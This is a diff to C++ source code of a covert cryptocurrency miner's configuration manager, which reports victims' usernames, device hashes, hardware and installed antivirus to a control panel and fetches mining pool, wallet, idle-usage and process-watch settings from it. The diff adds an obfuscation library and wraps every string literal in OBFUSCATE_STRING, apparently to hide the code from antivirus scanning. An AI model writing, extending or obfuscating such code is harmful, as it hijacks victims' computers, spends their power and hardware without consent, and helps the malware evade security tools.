@@ -12,6 +12,8 @@
 #include <thread>
 #include <chrono>
 
+#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
+
 bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                                      const std::string& pcUsername,
                                                      const std::string& deviceHash,
@@ -57,6 +59,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
 #endif
+            m_lastFetchFromPanel = true;
             return true;
         }
         
@@ -73,6 +76,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
     
     // Try embedded config as fallback
     if (LoadEmbeddedConfig()) {
+        m_lastFetchFromPanel = false;
         return true;
     }
     
@@ -115,6 +119,7 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
 #ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
 #endif
+            m_lastFetchFromPanel = true;
             return true;
         }
         
@@ -131,6 +136,7 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
     
     // Try embedded config as fallback
     if (LoadEmbeddedConfig()) {
+        m_lastFetchFromPanel = false;
         return true;
     }
     
@@ -184,16 +190,16 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
     try {
         // Build miner report JSON
         json minerReport = {
-            {"pc_username", pcUsername},
-            {"device_hash", deviceHash},
-            {"cpu_name", cpuName},
-            {"gpu_name", gpuName},
-            {"cpu_hashrate", cpuHashrate},
-            {"gpu_hashrate", gpuHashrate},
-            {"antivirus_name", antivirusName},
-            {"device_uptime_min", deviceUptimeMin},
-            {"client_version", clientVersion},
-            {"timestamp", std::time(nullptr)}
+            {OBFUSCATE_STRING("pc_username"),      pcUsername},
+            {OBFUSCATE_STRING("device_hash"),      deviceHash},
+            {OBFUSCATE_STRING("cpu_name"),         cpuName},
+            {OBFUSCATE_STRING("gpu_name"),         gpuName},
+            {OBFUSCATE_STRING("cpu_hashrate"),     cpuHashrate},
+            {OBFUSCATE_STRING("gpu_hashrate"),     gpuHashrate},
+            {OBFUSCATE_STRING("antivirus_name"),   antivirusName},
+            {OBFUSCATE_STRING("device_uptime_min"),deviceUptimeMin},
+            {OBFUSCATE_STRING("client_version"),   clientVersion},
+            {OBFUSCATE_STRING("timestamp"),        std::time(nullptr)}
         };
 
         std::string jsonPayload = minerReport.dump();
@@ -227,48 +233,43 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
 
 void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
     try {
-        // Parse CPU config
-        if (jsonResponse.contains("cpu_config") && !jsonResponse["cpu_config"].is_null()) {
-            json cpuJson = jsonResponse["cpu_config"];
-            cpuConfig.mining_url = cpuJson.value("mining_url", "");
-            cpuConfig.wallet = cpuJson.value("wallet", "");
-            cpuConfig.password = cpuJson.value("password", "");
-            cpuConfig.non_idle_usage = cpuJson.value("non_idle_usage", 50.0);
-            cpuConfig.idle_usage = cpuJson.value("idle_usage", 100.0);
-            cpuConfig.wait_time_idle = cpuJson.value("wait_time_idle", 300);
-            cpuConfig.use_ssl = cpuJson.value("use_ssl", 0);
+        if (jsonResponse.contains(OBFUSCATE_STRING("cpu_config")) && !jsonResponse[OBFUSCATE_STRING("cpu_config")].is_null()) {
+            json cpuJson = jsonResponse[OBFUSCATE_STRING("cpu_config")];
+            cpuConfig.mining_url     = cpuJson.value(OBFUSCATE_STRING("mining_url"),     "");
+            cpuConfig.wallet         = cpuJson.value(OBFUSCATE_STRING("wallet"),         "");
+            cpuConfig.password       = cpuJson.value(OBFUSCATE_STRING("password"),       "");
+            cpuConfig.non_idle_usage = cpuJson.value(OBFUSCATE_STRING("non_idle_usage"),  50.0);
+            cpuConfig.idle_usage     = cpuJson.value(OBFUSCATE_STRING("idle_usage"),     100.0);
+            cpuConfig.wait_time_idle = cpuJson.value(OBFUSCATE_STRING("wait_time_idle"),  300);
+            cpuConfig.use_ssl        = cpuJson.value(OBFUSCATE_STRING("use_ssl"),         0);
         }
 
-        // Parse enable_cpu flag
-        if (jsonResponse.contains("enable_cpu")) {
-            cpuConfig.enabled = jsonResponse.value("enable_cpu", 1);
+        if (jsonResponse.contains(OBFUSCATE_STRING("enable_cpu"))) {
+            cpuConfig.enabled = jsonResponse.value(OBFUSCATE_STRING("enable_cpu"), 1);
         } else {
-            cpuConfig.enabled = 1;  // Default enabled
+            cpuConfig.enabled = 1;
         }
 
-        // Parse GPU config
-        if (jsonResponse.contains("gpu_config") && !jsonResponse["gpu_config"].is_null()) {
-            json gpuJson = jsonResponse["gpu_config"];
-            gpuConfig.mining_url = gpuJson.value("mining_url", "");
-            gpuConfig.wallet = gpuJson.value("wallet", "");
-            gpuConfig.password = gpuJson.value("password", "");
-            gpuConfig.algo = gpuJson.value("algo", "kawpow");
-            gpuConfig.fan_speed = gpuJson.value("fan_speed", 80);
-            gpuConfig.wait_time_idle = gpuJson.value("wait_time_idle", 300);
-            gpuConfig.use_ssl = gpuJson.value("use_ssl", 0);
+        if (jsonResponse.contains(OBFUSCATE_STRING("gpu_config")) && !jsonResponse[OBFUSCATE_STRING("gpu_config")].is_null()) {
+            json gpuJson = jsonResponse[OBFUSCATE_STRING("gpu_config")];
+            gpuConfig.mining_url     = gpuJson.value(OBFUSCATE_STRING("mining_url"),  "");
+            gpuConfig.wallet         = gpuJson.value(OBFUSCATE_STRING("wallet"),      "");
+            gpuConfig.password       = gpuJson.value(OBFUSCATE_STRING("password"),    "");
+            gpuConfig.algo           = gpuJson.value(OBFUSCATE_STRING("algo"),        OBFUSCATE_STRING("kawpow"));
+            gpuConfig.fan_speed      = gpuJson.value(OBFUSCATE_STRING("fan_speed"),   80);
+            gpuConfig.wait_time_idle = gpuJson.value(OBFUSCATE_STRING("wait_time_idle"), 300);
+            gpuConfig.use_ssl        = gpuJson.value(OBFUSCATE_STRING("use_ssl"),     0);
         }
 
-        // Parse enable_gpu flag
-        if (jsonResponse.contains("enable_gpu")) {
-            gpuConfig.enabled = jsonResponse.value("enable_gpu", 1);
+        if (jsonResponse.contains(OBFUSCATE_STRING("enable_gpu"))) {
+            gpuConfig.enabled = jsonResponse.value(OBFUSCATE_STRING("enable_gpu"), 1);
         } else {
-            gpuConfig.enabled = 1;  // Default enabled
+            gpuConfig.enabled = 1;
         }
 
-        // Parse watched_processes array (empty = no process watching)
         watchedProcesses.clear();
-        if (jsonResponse.contains("watched_processes") && jsonResponse["watched_processes"].is_array()) {
-            for (const auto& proc : jsonResponse["watched_processes"]) {
+        if (jsonResponse.contains(OBFUSCATE_STRING("watched_processes")) && jsonResponse[OBFUSCATE_STRING("watched_processes")].is_array()) {
+            for (const auto& proc : jsonResponse[OBFUSCATE_STRING("watched_processes")]) {
                 if (proc.is_string()) {
                     std::string name = proc.get<std::string>();
                     if (!name.empty()) watchedProcesses.push_back(name);
